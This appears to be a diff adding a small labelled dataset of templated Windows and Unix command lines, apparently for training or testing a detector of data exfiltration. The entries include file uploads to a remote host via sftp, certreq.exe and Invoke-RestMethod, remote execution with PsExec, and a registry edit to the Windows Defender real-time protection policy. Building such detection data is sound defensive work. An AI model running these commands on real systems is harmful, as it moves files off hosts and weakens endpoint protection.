@@ -1,0 +1,6 @@
+1	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+1	certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
+1	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
+0	cmd.exe /c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
